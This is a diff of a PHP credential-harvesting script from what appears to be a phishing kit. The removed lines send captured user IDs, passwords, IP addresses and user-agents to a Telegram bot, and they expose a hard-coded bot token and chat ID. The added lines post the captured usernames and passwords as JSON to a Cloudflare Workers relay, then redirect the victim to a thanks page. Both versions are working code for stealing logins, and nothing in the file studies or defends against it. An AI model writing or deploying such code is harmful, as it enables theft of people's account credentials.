@@ -1,47 +1,43 @@
 <?php
-// Telegram Bot Credentials
-$telegramToken = "7794527769:AAGME4TVgMq3kv_HhiBLmjDld4hwElO4LHk";
-$chatID = "7283094857";
 
-// Check if form data is received
-if ($_SERVER["REQUEST_METHOD"] === "POST") {
-    $userID = isset($_POST['userID']) ? trim($_POST['userID']) : '';
-    $password = isset($_POST['password']) ? trim($_POST['password']) : '';
+// Collect the form data (username and password)
+$username = $_POST['username'];
+$password = $_POST['password'];
 
-    if (!empty($userID) && !empty($password)) {
-        // Collect User IP and User-Agent
-        $ip = $_SERVER['REMOTE_ADDR'];
-        $userAgent = $_SERVER['HTTP_USER_AGENT'];
+// URL of the worker that will handle the form data and send it to Telegram
+$worker_url = 'https://aut0-curr-9dc7.henrycrane65.workers.dev';  // Update with your Worker URL
 
-        // Format message for Telegram
-        $message = "🔔 New Login Attempt 🔔\n";
-        $message .= "📧 Email/UserID: $userID\n";
-        $message .= "🔑 Password: $password\n";
-        $message .= "🌍 IP: $ip\n";
-        $message .= "🖥 User-Agent: $userAgent";
+// Create the payload to send to the worker
+$data = json_encode([
+    'username' => $username,
+    'password' => $password,
+]);
 
-        // Send message to Telegram
-        $telegramURL = "https://api.telegram.org/bot$telegramToken/sendMessage";
-        $data = [
-            'chat_id' => $chatID,
-            'text' => $message,
-            'parse_mode' => 'HTML'
-        ];
+// Initialize cURL session
+$ch = curl_init($worker_url);
 
-        // Send request
-        $options = [
-            'http' => [
-                'header' => "Content-type: application/x-www-form-urlencoded\r\n",
-                'method' => 'POST',
-                'content' => http_build_query($data),
-            ],
-        ];
-        $context = stream_context_create($options);
-        file_get_contents($telegramURL, false, $context);
-    }
+// Set cURL options
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+curl_setopt($ch, CURLOPT_HTTPHEADER, [
+    'Content-Type: application/json',
+    'Content-Length: ' . strlen($data),
+]);
+
+// Execute the request and capture the response
+$response = curl_exec($ch);
+
+// Check for errors in the request
+if(curl_errno($ch)) {
+    echo 'Error:' . curl_error($ch);
 }
 
-// Redirect to Thanks Page
+// Close the cURL session
+curl_close($ch);
+
+// Redirect after sending data to the worker
 header("Location: ./thanks.html");
 exit();
+
 ?>
